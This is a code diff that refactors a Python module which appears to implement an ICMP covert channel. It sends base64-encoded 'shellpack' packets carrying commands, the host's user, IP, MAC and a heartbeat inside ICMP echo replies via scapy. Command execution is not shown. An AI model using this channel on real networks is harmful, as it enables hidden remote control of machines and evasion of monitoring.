@@ -9,49 +9,12 @@ TTL = int(64)
 ICMP_ID = int(12800)
 
 class Host:
-
     def __init__(self):
-        self.ip = self.get_local_ip()
-        self.iface = self.get_iface()
-        self.mac = self.get_mac()
+        self.ip = get_local_ip()
+        self.iface = get_iface(self.ip)
+        self.mac = get_mac(self.iface)
         self.user = pwd.getpwuid(os.getuid())[0]
         self.heartbeat = 0
-
-    def get_iface(self) -> str:
-        nics = psutil.net_if_addrs()
-        iface = [i for i in nics for j in nics[i] if j.address==self.ip and j.family==socket.AF_INET][0]
-        return iface
-        
-    def get_local_ip(self) -> str:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            s.connect(("192.255.255.255", 1))
-            ip = s.getsockname()[0]
-        except:
-            ip = '127.0.0.1'
-        finally:
-            s.close()
-        return ip
-
-    def get_mac(self) -> str:
-        nics = psutil.net_if_addrs()
-        mac = ([j.address for i in nics for j in nics[i] if i==self.iface and j.family==psutil.AF_LINK])[0]
-        return mac.replace('-',':')
-
-    def build_shellpack(self, command: str, message: str | None = None) -> dict:
-        shellpack = {
-            "command": command,
-            "message": message,
-            "ip": self.ip,
-            "mac": self.mac,
-            "iface": self.iface,
-            "user": self.user,
-            "heartbeat": self.heartbeat
-            }
-
-        shellpack = str(shellpack).encode('utf-8')
-        shellpack = base64.b64encode(shellpack)
-        return shellpack
 
     def __str__(self) -> str:
         report =  f"[ Host Information ]\n"
@@ -61,12 +24,52 @@ class Host:
 
         return report
 
-class Target:
-    def __init__(self, ip):
-        self.ip = ip
-    
-    def send(self, shellpack: str) -> bool:
-        data = (IP(dst=self.ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
+class Target(Host):
+    def __init__(self, shellpack):
+        self.ip = shellpack['ip']
+        self.iface = shellpack['iface']
+        self.mac = shellpack['mac']
+        self.user = shellpack['user']
+        self.heartbeat = 0
+
+def send(ip, shellpack: str) -> bool:
+        data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
         sr(data, timeout=0, verbose=0)
         
         return True
+
+def get_iface(ip) -> str:
+    nics = psutil.net_if_addrs()
+    iface = [i for i in nics for j in nics[i] if j.address==ip and j.family==socket.AF_INET][0]
+    return iface
+    
+def get_local_ip() -> str:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("192.255.255.255", 1))
+        ip = s.getsockname()[0]
+    except:
+        ip = '127.0.0.1'
+    finally:
+        s.close()
+    return ip
+
+def get_mac(iface) -> str:
+    nics = psutil.net_if_addrs()
+    mac = ([j.address for i in nics for j in nics[i] if i==iface and j.family==psutil.AF_LINK])[0]
+    return mac.replace('-',':')
+
+def build_shellpack(host, command: str, message: str | None = None) -> dict:
+    shellpack = {
+        "command": command,
+        "message": message,
+        "ip": host.ip,
+        "mac": host.mac,
+        "iface": host.iface,
+        "user": host.user,
+        "heartbeat": host.heartbeat
+        }
+
+    shellpack = str(shellpack).encode('utf-8')
+    shellpack = base64.b64encode(shellpack)
+    return shellpack
